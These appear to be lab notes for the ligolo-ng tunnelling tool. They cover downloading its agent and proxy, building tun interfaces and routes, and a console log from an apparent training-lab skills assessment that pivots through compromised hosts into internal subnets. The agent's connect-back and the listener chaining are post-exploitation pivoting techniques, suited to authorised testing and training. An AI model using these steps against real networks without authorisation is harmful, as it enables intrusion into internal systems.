```bash
mkdir ligolo_ng
cd ligolo_ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip
sudo unzip ligolo-ng_agent_0.7.5_windows_amd64.zip
tar xvzf ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
tar xvzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
```

```bash
sudo ip tuntap add user <username> mode tun <Interface name>
sudo ip link set <Interface name> up
ip  addr show <Interface name>
sudo ip route add <IP range IP/CIDR> dev <Interface name>
```
##### Assign a IPv4 address to ligolo 
```
sudo ip addr add <IP range IP/CIDR> dev ligolo   # pick .250 or any free host-ID
sudo ip link set up dev ligolo
```

```
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

```
sudo ./agent -connect <IP>:<Port> -retry -ignore-cert 
```
# Skills assessment

```bash
sudo ip tuntap add user apu mode tun ligolo
sudo ip link set ligolo up
ip  addr show ligolo
sudo ip route add 172.16.5.0/24 dev ligolo
```

```bash
sudo ip tuntap add user apu mode tun ligolo1
sudo ip link set ligolo1 up
ip  addr show ligolo1
sudo ip route add 172.16.6.0/24 dev ligolo1
```

```bash
sudo ip tuntap add user apu mode tun ligolo2
sudo ip link set ligolo2 up
ip  addr show ligolo2
sudo ip route add 172.16.10.0/24 dev ligolo2
```

```
[Agent : webadmin@inlanefreight.local] » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
error: listen tcp 0.0.0.0:11602: bind: address already in use
[Agent : webadmin@inlanefreight.local] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
INFO[1154] Listener 1 created on remote agent!          
[Agent : webadmin@inlanefreight.local] » INFO[1210] Agent joined.                                 name="PIVOT-SRV01\\mlefay@PIVOT-SRV01" remote="127.0.0.1:53572"
[Agent : webadmin@inlanefreight.local] » 
[Agent : webadmin@inlanefreight.local] » start -tun ligolo1
error: invalid flag: -tun
[Agent : webadmin@inlanefreight.local] » start --tun ligolo1
error: already running
[Agent : webadmin@inlanefreight.local] » start --tun ligolo1
error: already running
[Agent : webadmin@inlanefreight.local] » session
? Specify a session : 3 - #3 - PIVOT-SRV01\mlefay@PIVOT-SRV01 - 127.0.0.1:53572
[Agent : PIVOT-SRV01\mlefay@PIVOT-SRV01] » start --tun ligolo1
```